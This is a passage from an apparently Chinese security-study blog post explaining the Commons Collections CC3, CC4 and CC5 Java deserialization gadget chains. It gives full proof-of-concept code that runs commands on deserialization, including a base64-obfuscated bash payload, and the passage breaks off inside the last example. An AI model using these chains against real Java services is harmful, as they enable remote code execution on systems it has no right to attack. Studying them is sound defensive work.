java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个与代理对象相关联的InvocationHandler map_handler</span></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理对象proxy_map来代理map_handler，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法</span></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再创建一个AnnotationInvocationHandler对象，用来触发代理对象proxy_map的方法执行,从而跳转AnnotationInvocationHandler.voker()</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-4"   >
          <a href="#解析-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-4" class="headerlink" title="解析"></a>解析</h2>
      <p>即按照<code>CC1</code>的前半部分链子加上经典的<code>CITTN</code>即可，不过多赘述了</p>

        <h1 id="四、CC4"   >
          <a href="#四、CC4" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、CC4" class="headerlink" title="四、CC4"></a>四、CC4</h1>
      
        <h2 id="JAVA源码版本-8u40-3"   >
          <a href="#JAVA源码版本-8u40-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-3" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807120904293.png" alt="image-20220807120904293"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TrAXFilter构造函数</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-3"   >
          <a href="#限制-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>
<p><code>PriorityQueue</code>在<code>commons-collections4</code>下才开始有</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="POC-3"   >
          <a href="#POC-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">        <span class="comment">//不用设置PriorityQueue.queue为TemplatesImpl,因为TrAXFilter构造函数可以直接触发</span></span><br><span class="line">        setField(queue,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setField(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc4&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc4&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-5"   >
          <a href="#解析-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-5" class="headerlink" title="解析"></a>解析</h2>
      <p>感觉和<code>CC2</code>差不多，就是后面的利用链子，由于是<code>TrAXFilter</code>构造函数直接触发的，所以不用设置<code>PriorityQueue.queue</code>为<code>TemplatesImpl</code>，没有什么太多的亮点。</p>

        <h1 id="五、CC5"   >
          <a href="#五、CC5" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、CC5" class="headerlink" title="五、CC5"></a>五、CC5</h1>
      
        <h2 id="JAVA源码版本-8u40-4"   >
          <a href="#JAVA源码版本-8u40-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-4" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801095044379.png" alt="image-20220801095044379"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">TiedMapEntry.toString()-&gt;getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-4"   >
          <a href="#限制-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-4" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-4"   >
          <a href="#POC-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;./test.sh&quot;</span>&#125;)&#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        <span class="comment">//调用Get方法</span></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);</span></span><br><span class="line">        Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="解析-6"   >
          <a href="#解析-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-6" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="BadAttributeValueExpException-readObject"   >
          <a href="#BadAttributeValueExpException-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException.readObject()"></a><code>BadAttributeValueExpException.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110613623.png" alt="image-20220801110613623"></p>
<p><code>valObj</code>即为<code>TiedMapEntry</code></p>

        <h3 id="TiedMapEntry-toString-gt-getValue"   >
          <a href="#TiedMapEntry-toString-gt-getValue" class="heading-link"><i class="fas fa-link"></i></a><a href="#TiedMapEntry-toString-gt-getValue" class="headerlink" title="TiedMapEntry.toString()-&gt;getValue()"></a><code>TiedMapEntry.toString()-&gt;getValue()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110414584.png" alt="image-20220801110414584"></p>
<p>后续的<code>map</code>即为<code>LazyMap</code>，<code>key</code>为<code>123</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110428194.png" alt="image-20220801110428194"></p>

        <h3 id="LazyMap-get-1"   >
          <a href="#LazyMap-get-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-1" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h2 id="🔺注"   >
          <a href="#🔺注" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注" class="headerlink" title="🔺注"></a>🔺注</h2>
      <p>在设置<code>BadAttributeValueExpException</code>对象时，使用的是其中的<code>Field</code>来进行设置的</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">val.set(poc,tiedmap);</span><br></pre></td></tr></table></div></figure>

<p>原因在于在<code>BadAttributeValueExpException</code>构造函数及<code>readObject</code>函数中，有如下代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151544294.png" alt="image-20220801151544294"></p>
<p>这样就能在序列化时不进行本地<code>RCE</code>，而在服务器反序列化时进行<code>RCE</code>，因为如果在序列化时进行本地<code>RCE</code>，<code>val</code>就会由于链子变成<code>Runtime</code>类，由于<code>Runtime</code>没办法直接序列化，所以其<code>val</code>就会变成如下执行命令结果的字符串，从而在反序列时没办法调用到<code>TiedMapEntry.toString()</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151900635.png" alt="image-20220801151900635"></p>
<p>对比原<code>POC</code>如下，其<code>val</code>在序列化时还是一个<code>TiedMapEntry</code>对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801152047107.png" alt="image-20220801152047107"></p>

        <h2 id="无数组"   >
          <a href="#无数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#无数组" class="headerlink" title="无数组"></a>无数组</h2>
      <p>至于无数组版本的，即如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802155244072.png" alt="image-20220802155244072"></p>
<p>做点小改动，在<code>TiedMapEntry</code>中传入<code>TemplatesImpl</code>即可，确保在<code>LazyMap.get()</code>的时候，传入的<code>key</code>为<code>TemplatesImpl</code>，从而进行调用到对应的<code>TemplatesImpl.newTransformer()</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802154737033.png" alt="image-20220802154737033"></p>
<p>相关<code>POC</code>如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> test.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException, IOException </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,Li90ZXN0LnNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span 